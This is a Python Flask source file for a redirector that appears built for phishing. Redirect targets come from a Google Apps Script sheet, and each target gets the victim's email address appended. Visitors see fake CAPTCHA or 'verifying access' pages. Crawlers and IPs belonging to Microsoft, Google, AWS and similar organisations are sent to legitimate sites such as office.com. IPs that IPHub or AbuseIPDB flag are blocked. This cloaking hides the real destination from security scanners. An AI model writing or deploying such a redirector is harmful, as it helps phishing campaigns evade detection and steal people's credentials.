import random
import requests
from flask import Flask, request, redirect, render_template, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
# Add these imports at the top
from urllib.parse import urlparse
import re

app = Flask(__name__)

# Rate Limiter to prevent excessive requests
limiter = Limiter(key_func=get_remote_address)
limiter.init_app(app)

# API Keys
IPHUB_API_KEY = "YOUR_FREE_IPHUB_API_KEY"
ABUSEIPDB_API_KEY = "YOUR_ABUSEIPDB_API_KEY"

# URL of the AppScript that returns redirection data
APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=REDIRECT&range=A1:F"

# Cache for flagged IPs
FLAGGED_IPS = set()


# Add this list of legitimate domains
LEGITIMATE_DOMAINS = [
    "https://www.google.com",
    "https://www.office.com",
    "https://outlook.live.com",
    "https://www.microsoft.com",
    "https://www.bing.com",
    "https://www.yahoo.com"
]

# Add this function to detect bots and organizations
def is_bot_or_org(ip, user_agent, org_info):
    # List of keywords indicating bot/crawler organizations
    org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure', 
                   'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
    
    # Check user agent for bot indicators
    bot_patterns = [
        r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
        r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
    ]
    
    # Convert to lowercase for case-insensitive matching
    user_agent = user_agent.lower()
    org_info = org_info.lower() if org_info else ""
    
    # Check if user agent contains bot patterns
    if any(re.search(pattern, user_agent) for pattern in bot_patterns):
        return True
        
    # Check if organization name contains keywords
    if any(keyword in org_info for keyword in org_keywords):
        return True
        
    return False

# Function to check if an IP is flagged using IPHub or AbuseIPDB
def is_ip_flagged(ip):
    if ip in FLAGGED_IPS:
        return True  # Already flagged

    try:
        # Check IP in IPHub
        headers = {"X-Key": IPHUB_API_KEY}
        response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
        if response.status_code == 200 and response.json().get("block", 0) == 1:
            FLAGGED_IPS.add(ip)
            return True  # Flagged

        # Check IP in AbuseIPDB (if available)
        headers = {"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"}
        response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers=headers)
        if response.status_code == 200 and response.json().get("data", {}).get("abuseConfidenceScore", 0) > 50:
            FLAGGED_IPS.add(ip)
            return True  # Flagged
    except Exception as e:
        print("Error checking IP:", e)

    return False  # Safe

# Function to fetch redirect mappings from the AppScript
def fetch_redirect_data():
    try:
        response = requests.get(APPSCRIPT_URL)
        if response.status_code == 200:
            raw_data = response.json()
            if not isinstance(raw_data, list) or len(raw_data) < 2:
                return []

            headers = raw_data[0]
            return [dict(zip(headers, row)) for row in raw_data[1:]]
    except Exception as e:
        print("Exception:", str(e))
    return []

# Function to generate random metadata
def generate_random_metadata():
    titles = ["Verifying Access", "Loading Secure Page", "Authentication Required"]
    descriptions = [
        "Please wait while we verify your request...",
        "Ensuring a secure browsing experience...",
        "Processing your request, please wait..."
    ]
    keywords = [
        "secure, verification, human check",
        "captcha, security, authentication",
        "bot protection, identity verification"
    ]
    
    return {
        "title": random.choice(titles),
        "description": random.choice(descriptions),
        "keywords": random.choice(keywords)
    }

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/<token>')
def token_path_handler(token):
    data = fetch_redirect_data()

    # Ensure token is treated as a string and filter valid URLs
    redirect_map = {str(row['token']): row['redirectURL'] for row in data if row['redirectURL']}

    if token in redirect_map:
        redirect_url = redirect_map[token]

        # Capture email parameter and append if present
        email = request.args.get('email')
        if email:
            redirect_url = f"{redirect_url}?email={email}"

        return redirect(redirect_url)

    # Render an error template if path not found
    return render_template('error.html', message="Path not found"), 404

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/archive<int:num>')
def path_handler(num):
    data = fetch_redirect_data()

    # Convert data into a dictionary { path: redirectURL }
    redirect_map = {row['path']: row['redirectURL'] for row in data if row['redirectURL']}

    path = f'archive{num}'

    if path in redirect_map:
        redirect_url = redirect_map[path]

        # Capture email parameter and append if present
        email = request.args.get('email')
        if email:
            redirect_url = f"{redirect_url}?email={email}"

        # Render CAPTCHA page before redirecting
        return render_template('captcha.html', redirect_url=redirect_url)

    # Render an error template if path not found
    return render_template('error.html', message="Path not found"), 404


# Route to handle redirection for '/directory<int:num>'
@app.route('/directory<int:num>')
@limiter.limit("10 per minute")  # Prevent excessive requests
def premium_path_handler(num):
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    try:
        # Get organization info using ipinfo.io
        ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
        org_info = ip_info.get('org', '')
        
        # Check if it's a bot or from blocked organization
        if is_bot_or_org(visitor_ip, user_agent, org_info):
            # Redirect to a random legitimate domain
            return redirect(random.choice(LEGITIMATE_DOMAINS))
            
    except Exception as e:
        print(f"Error checking IP info: {e}")

    # Block empty or suspicious user-agents
    if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
        return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

    # Check if IP is flagged
    if is_ip_flagged(visitor_ip):
        return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

    data = fetch_redirect_data()
    redirect_map = {row['directory']: row['redirectURL'] for row in data if row['redirectURL']}

    path = f'directory{num}'

    if path in redirect_map:
        redirect_url = redirect_map[path]
        email = request.args.get('email', '')

        metadata = generate_random_metadata()

        return render_template(
            'redirect.html', 
            redirect_url=redirect_url, 
            email=email, 
            meta_title=metadata['title'], 
            meta_description=metadata['description'], 
            meta_keywords=metadata['keywords'],
            random_token=random.randint(100000, 999999)
        )

    return render_template('error.html', message="Path not found"), 404



# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
